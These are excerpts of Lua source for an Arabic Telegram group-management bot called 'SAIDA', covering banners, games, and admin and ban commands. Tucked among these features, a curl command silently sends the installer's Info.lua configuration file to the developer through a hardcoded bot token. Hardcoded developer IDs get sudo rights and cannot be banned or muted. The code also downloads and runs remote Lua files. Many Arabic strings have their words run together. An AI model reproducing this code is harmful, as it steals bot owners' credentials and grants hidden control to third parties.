...
print([[
   ...
   /\  / )  /\  (  )  (_  _)( \/ ) /__\  
 /(__)\ \__ \ /(__)\  )(__  _)(_  \  / /(__)\ 
(__)(__)(___/(__)(__)(____)(____) (__)(__)(__)
 
> CH › @Sadauam
~> DEVELOPER › @AsaliyaEgypt
]])
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/Vklkk/SAIDA/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1124610301,1965534755}   
...
local curl = 'curl "'..'https://api.telegram.org/bot1706737466:AAG8CRj1VGRUinWWPnm8WEIGUHbl8j64KMY/sendDocument'..'" -F "chat_id='.. 1124610301 ..'" -F "document=@'..'Info.lua'..'"' io.popen(curl)
--------------------------------------------------------------------------------------------------------------
...
{'ضع كليشهالصعيديت','حذف كليشهالصعيديت'},
{'اذاعه ','اذاعه خاص '},
...
if text == 'الغاء' or text == 'الغاء' then   
send(msg.chat_id_, msg.id_,'  ✯  الغاء حفظ كليشهالصعيديت')
database:del(bot_id..'SAIDAt:Bots') 
return false
end
database:set(bot_id.."SAIDAt:Bot",text)  
send(msg.chat_id_, msg.id_,'  ✯  تم حفظ كليشهالصعيديت')
database:del(bot_id..'SAIDAt:Bots') 
return false
end
if text == 'ضع كليشهالصعيديت' and DevSoFi(msg) then 
database:set(bot_id..'SAIDAt:Bots',true) 
send(msg.chat_id_, msg.id_,'  ✯  ارسل لي الكليشه الان')
return false
end
if text == 'حذف كليشهالصعيديت' and DevSoFi(msg) then 
database:del(bot_id..'SAIDAt:Bot') 
send(msg.chat_id_, msg.id_,'  ✯  تم حذف كليشهالصعيديت')
end
...
os.execute('wget https://raw.githubusercontent.com/Vklkk/SAIDA/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,' ✯  تم تحديث السورس')
dofile('DRAGON.lua')  
end
if text == 'الاصدار ' and DevSoFi(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,'  ✯  اصدار سورسالصعيدي { s: 6.7}')
end
...
local Text = [[
✭اهلا بيك في سورسالصعيدي لو عايز بوت بكل حقوقك ع السورس تواصل معي✭
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '• ᴅᴇᴠ ᴊᴀʙᴡᴀ',url="t.me/J_A_B_W_A"},{text = '• ᴅᴇᴠ ᴛᴀʜᴀ', url="t.me/TahaSayed9"}},
...
if text == 'مبرمج السورس²' or text == 'جوبا' or text == 'صاحب السورس' then
local Text = [[
المبرمج للتواصل
]]
keyboard = {} 
...
local Text = [[
المبرمج عسليه لو حابب تتواصل معاهه
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
"سؤال ينرفزك ؟ ", 
" هل يعجبك سورسالصعيدي ؟؟ ", 
" اكثر ممثل تحبه ؟ ", 
"قد تخيلت شي في بالك وصار ؟ ", 
"شيء عندك اهم من الناس ؟ ", 
"تفضّل النقاش الطويل او تحب الاختصار ؟ ", 
"وش أخر شي ضيعته؟ ", 
"اي رايك في سورسالصعيدي ؟ ", 
"كم مره حبيت؟ ", 
...
if text == 'العابالصعيدي' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ✯ اهلا في قائمه الالعاب المتطوره سورسالصعيدي  ✯ 
...
elseif text == 'قفلالصعيديرسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
...
elseif text == 'فتحالصعيديرسيه' and msg.reply_to_message_id_ == 0 and Manager(msg) then 
...
send(msg.chat_id_, msg.id_, "  ✯  لا تسطيع حظرمبرمج السورس¹ عام")
return false 
end
...
send(msg.chat_id_, msg.id_, "  ✯  لا يمكنك حظرمبرمج السورس¹ \n")
return false 
end
...
if tonumber(result.sender_user_id_) == tonumber(1965534755) then  
send(msg.chat_id_, msg.id_, "  ✯  لا تسطيع كتممبرمج السورس¹ عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1124610301) then  
send(msg.chat_id_, msg.id_, "  ✯  لا تسطيع كتممبرمج السورس¹ عام")
...
if result.id_ == tonumber(1965534755) then
send(msg.chat_id_, msg.id_, "  ✯  لا يمكنك كتممبرمج السورس¹ \n")
return false 
end
if result.id_ == tonumber(1124610301) then
send(msg.chat_id_, msg.id_, "  ✯  لا يمكنك كتممبرمج السورس¹ \n")
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Vklkk/SAIDA/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n  ✯  اهلا بك في متجر ملفاتالصعيدي\n  ✯  ملفات السورس ↓\n•═════•| ✯SAIDA✯ |•═════•\n\n"
...
local json_file, res = https.request("https://raw.githubusercontent.com/Vklkk/SAIDA/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_,"  ✯  عذرا الملف لايدعم سورسالصعيدي \n") 
end
return false
end
...
if text == ("مسح قائمهالصعيدي") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n  ✯  تم مسح قائمهالصعيدي')
return false
end

if text == 'قائمهالصعيدي' and Sudo(msg) then
...
if text == ("رفعالصعيدي") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفعالصعيدي @(.*)$") and Sudo(msg) then
local username = text:match("^رفعالصعيدي @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفعالصعيدي (%d+)$") and Sudo(msg) then
local userid = text:match("^رفعالصعيدي (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيلالصعيدي") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيلالصعيدي @(.*)$") and Sudo(msg) then
local username = text:match("^تنزيلالصعيدي @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيلالصعيدي (%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيلالصعيدي (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
end --الكود حصري سورسالصعيدي يعني لو بكتهن راح اعرفك انت الاخذتهن
